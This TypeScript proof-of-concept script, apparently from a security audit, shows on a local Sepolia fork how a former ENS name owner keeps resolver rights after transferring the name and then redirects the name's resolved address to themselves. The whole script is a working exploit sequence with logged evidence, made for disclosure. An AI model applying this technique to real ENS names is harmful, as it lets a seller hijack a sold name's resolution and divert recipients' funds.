import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { getTokenId } from '@ensdomains/ensjs/public/v2'
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import { revokeRolesWriteParameters } from '@ensdomains/ensjs/wallet/v2'
import {
  createWalletClient,
  encodeFunctionData,
  http,
  namehash,
  parseAbi,
  type Address,
  type Hash,
} from 'viem'
import { mnemonicToAccount } from 'viem/accounts'
import { createMakeV2Name } from '../fixtures/makeV2Name.js'
import {
  publicClient,
  testClient,
  walletClient,
} from '../helpers/anvil-client.js'

const RPC = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const MNEMONIC = 'test test test test test test test test test test test junk'
const OWNER = mnemonicToAccount(MNEMONIC, { addressIndex: 1 })
const RECIPIENT = mnemonicToAccount(MNEMONIC, { addressIndex: 2 })
const ATTACKER = OWNER

const ensjsSepolia = ensL1Contracts[supportedL1Chains.sepolia]
const ETH_REGISTRY = ensjsSepolia.ensRegistry.address

// RegistryRolesLib is nybble-packed: ROLE_SET_RESOLVER is nybble 6 => bit 24.
const ROLE_SET_RESOLVER = 1n << 24n
const ROLE_SET_ADDR = 1n << 0n

const registryAbi = parseAbi([
  'function getResolver(string label) view returns (address)',
  'function getOwner(uint256 anyId) view returns (address)',
  'function hasRoles(uint256 anyId, uint256 roleBitmap, address account) view returns (bool)',
  'function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes data)',
])

const resolverAbi = parseAbi([
  'function hasRootRoles(uint256 roleBitmap, address account) view returns (bool)',
  'function setAddr(bytes32 node, address addr)',
  'function addr(bytes32 node) view returns (address)',
])

const ownerClient = createWalletClient({
  account: OWNER,
  chain: walletClient.chain!,
  transport: http(RPC),
})

function sameAddress(a: string, b: string) {
  return a.toLowerCase() === b.toLowerCase()
}

function pass(label: string, detail?: string) {
  console.log(`PASS ${label}${detail ? ` = ${detail}` : ''}`)
}

function assert(condition: unknown, label: string, detail?: string): asserts condition {
  if (!condition) {
    console.error(`SECURITY_ASSERTION_FAILURE ${label}${detail ? ` :: ${detail}` : ''}`)
    process.exitCode = 71
    throw new Error(`security assertion failed: ${label}`)
  }
  pass(label, detail)
}

async function waitTx(label: string, hash: Hash) {
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  console.log(
    `TX ${label} hash=${hash} status=${receipt.status} block=${receipt.blockNumber}`,
  )
  assert(receipt.status === 'success', `${label}_receipt_success`)
  return receipt
}

async function resolverForLabel(label: string): Promise<Address> {
  return publicClient.readContract({
    address: ETH_REGISTRY,
    abi: registryAbi,
    functionName: 'getResolver',
    args: [label],
  })
}

async function ownerForToken(tokenId: bigint): Promise<Address> {
  return publicClient.readContract({
    address: ETH_REGISTRY,
    abi: registryAbi,
    functionName: 'getOwner',
    args: [tokenId],
  })
}

async function registryHasSetResolver(label: string): Promise<boolean> {
  return publicClient.readContract({
    address: ETH_REGISTRY,
    abi: registryAbi,
    functionName: 'hasRoles',
    args: [labelToCanonicalId(label), ROLE_SET_RESOLVER, OWNER.address],
  })
}

async function resolverHasSetAddr(resolver: Address): Promise<boolean> {
  return publicClient.readContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'hasRootRoles',
    args: [ROLE_SET_ADDR, OWNER.address],
  })
}

async function resolvedEthAddress(resolver: Address, node: `0x${string}`): Promise<Address> {
  return publicClient.readContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'addr',
    args: [node],
  })
}

async function main() {
  console.log('=== ENS_TRANSFER_STALE_RESOLVER_AUTH_RAW_OUTPUT_BEGIN ===')
  console.log('AUDIT_MIRROR_COMMIT=cda79acaad59711b943fc68207ebb3f1d0ff8596')
  console.log('AUDITED_UPSTREAM_COMMIT=63772fd872af472ced58b009499355f3430c2a86')
  console.log(`ETH_REGISTRY=${ETH_REGISTRY}`)
  console.log(`FORMER_OWNER_ATTACKER=${OWNER.address}`)
  console.log(`RECIPIENT=${RECIPIENT.address}`)

  // Sepolia has occasionally had code at well-known Anvil mnemonic addresses.
  // The proof needs ordinary EOAs, matching the repo's own fixtures.
  await testClient.setCode({ address: OWNER.address, bytecode: '0x' })
  await testClient.setCode({ address: RECIPIENT.address, bytecode: '0x' })

  const makeV2Name = createMakeV2Name({ otherAccount: OWNER as any })
  const name = await makeV2Name({
    label: `stale-resolver-${Date.now()}`,
    owner: 'other',
  })
  const label = name.slice(0, -4)
  const node = namehash(name)
  const canonicalId = labelToCanonicalId(label)
  console.log(`NAME=${name}`)
  console.log(`LABEL=${label}`)
  console.log(`CANONICAL_ID=${canonicalId}`)

  const resolverBefore = await resolverForLabel(label)
  console.log(`RESOLVER_BEFORE=${resolverBefore}`)
  assert(
    resolverBefore !== '0x0000000000000000000000000000000000000000',
    'dedicated_resolver_attached',
    resolverBefore,
  )

  const tokenBefore = await getTokenId(publicClient, {
    label,
    registryAddress: ETH_REGISTRY,
  })
  console.log(`TOKEN_ID_BEFORE_REVOKE=${tokenBefore}`)

  const ownerBefore = await ownerForToken(tokenBefore)
  assert(
    sameAddress(ownerBefore, OWNER.address),
    'owner_before_transfer',
    ownerBefore,
  )

  assert(
    await registryHasSetResolver(label),
    'registry_ROLE_SET_RESOLVER_before_revoke',
    'true',
  )
  assert(
    await resolverHasSetAddr(resolverBefore),
    'former_owner_resolver_ROLE_SET_ADDR_before_transfer',
    'true',
  )

  // Make the post-transfer state unambiguous: before the token moves, point the
  // name at the RECIPIENT. The exploit must later change that correct record.
  const preSetHash = await ownerClient.writeContract({
    address: resolverBefore,
    abi: resolverAbi,
    functionName: 'setAddr',
    args: [node, RECIPIENT.address],
  })
  await waitTx('pretransfer_setAddr_recipient', preSetHash)

  const preResolution = await resolvedEthAddress(resolverBefore, node)
  assert(
    sameAddress(preResolution, RECIPIENT.address),
    'resolution_before_role_revoke',
    preResolution,
  )

  // Exact Portal behavior: revoke ONLY the base registry ROLE_SET_RESOLVER.
  // The admin bit and ROLE_CAN_TRANSFER_ADMIN remain untouched.
  const revokeParams = revokeRolesWriteParameters(ownerClient as any, {
    registryAddress: ETH_REGISTRY,
    account: OWNER.address,
    resource: canonicalId,
    roles: ['ROLE_SET_RESOLVER'],
  })
  const revokeData = encodeFunctionData({
    abi: revokeParams.abi,
    functionName: revokeParams.functionName,
    args: revokeParams.args,
  } as any)
  const revokeHash = await ownerClient.sendTransaction({
    to: ETH_REGISTRY,
    data: revokeData,
  })
  await waitTx('revoke_registry_ROLE_SET_RESOLVER_only', revokeHash)

  assert(
    !(await registryHasSetResolver(label)),
    'registry_ROLE_SET_RESOLVER_after_revoke',
    'false',
  )

  const resolverAfterRevoke = await resolverForLabel(label)
  assert(
    sameAddress(resolverAfterRevoke, resolverBefore),
    'resolver_pointer_survives_role_revoke',
    resolverAfterRevoke,
  )
  assert(
    await resolverHasSetAddr(resolverAfterRevoke),
    'resolver_ROLE_SET_ADDR_after_registry_revoke',
    'true',
  )

  // Revoking a registry role regenerates the ERC-1155 token. Re-read the
  // current token id exactly as the Portal does instead of using stale state.
  const currentTokenId = await getTokenId(publicClient, {
    label,
    registryAddress: ETH_REGISTRY,
  })
  console.log(`TOKEN_ID_AFTER_REVOKE=${currentTokenId}`)
  assert(
    currentTokenId !== tokenBefore,
    'token_id_regenerated_after_role_revoke',
    `${tokenBefore} -> ${currentTokenId}`,
  )

  // This is the terminal transaction in the Portal transfer plan when resolver
  // detachment is unavailable/false.
  const transferHash = await ownerClient.writeContract({
    address: ETH_REGISTRY,
    abi: registryAbi,
    functionName: 'safeTransferFrom',
    args: [OWNER.address, RECIPIENT.address, currentTokenId, 1n, '0x'],
  })
  const transferReceipt = await waitTx('safeTransferFrom_to_recipient', transferHash)

  const ownerAfterTransfer = await ownerForToken(currentTokenId)
  assert(
    sameAddress(ownerAfterTransfer, RECIPIENT.address),
    'owner_after_transfer',
    ownerAfterTransfer,
  )

  const resolverAfterTransfer = await resolverForLabel(label)
  assert(
    sameAddress(resolverAfterTransfer, resolverBefore),
    'resolver_after_transfer_same',
    resolverAfterTransfer,
  )

  const resolutionAfterTransfer = await resolvedEthAddress(resolverAfterTransfer, node)
  assert(
    sameAddress(resolutionAfterTransfer, RECIPIENT.address),
    'resolution_after_transfer_before_attack',
    resolutionAfterTransfer,
  )

  assert(
    await resolverHasSetAddr(resolverAfterTransfer),
    'former_owner_ROLE_SET_ADDR_after_transfer',
    'true',
  )

  // Decisive security assertion: AFTER recipient ownership is established and
  // resolution is correct, the former owner mutates the still-attached resolver.
  const attackHash = await ownerClient.writeContract({
    address: resolverAfterTransfer,
    abi: resolverAbi,
    functionName: 'setAddr',
    args: [node, ATTACKER.address],
  })
  const attackReceipt = await waitTx(
    'former_owner_post_transfer_setAddr_attacker',
    attackHash,
  )

  const ownerAfterAttack = await ownerForToken(currentTokenId)
  assert(
    sameAddress(ownerAfterAttack, RECIPIENT.address),
    'owner_after_attack_still_recipient',
    ownerAfterAttack,
  )

  const resolutionAfterAttack = await resolvedEthAddress(resolverAfterTransfer, node)
  assert(
    sameAddress(resolutionAfterAttack, ATTACKER.address),
    'resolution_after_attack_attacker',
    resolutionAfterAttack,
  )

  console.log(`ROLE_REVOKE_TX_HASH=${revokeHash}`)
  console.log(`ROLE_REVOKE_TX_BLOCK=${(await publicClient.getTransactionReceipt({ hash: revokeHash })).blockNumber}`)
  console.log(`TRANSFER_TX_HASH=${transferHash}`)
  console.log(`TRANSFER_TX_BLOCK=${transferReceipt.blockNumber}`)
  console.log(`ATTACK_TX_HASH=${attackHash}`)
  console.log(`ATTACK_TX_BLOCK=${attackReceipt.blockNumber}`)
  console.log('SECURITY_ASSERTION=PASS')
  console.log('EVIDENCE_STATE=IMPACT-PROVEN')
  console.log('=== ENS_TRANSFER_STALE_RESOLVER_AUTH_RAW_OUTPUT_END ===')
}

main().catch((error) => {
  console.error('POC_FATAL_ERROR')
  console.error(error)
  process.exit(process.exitCode || 1)
})
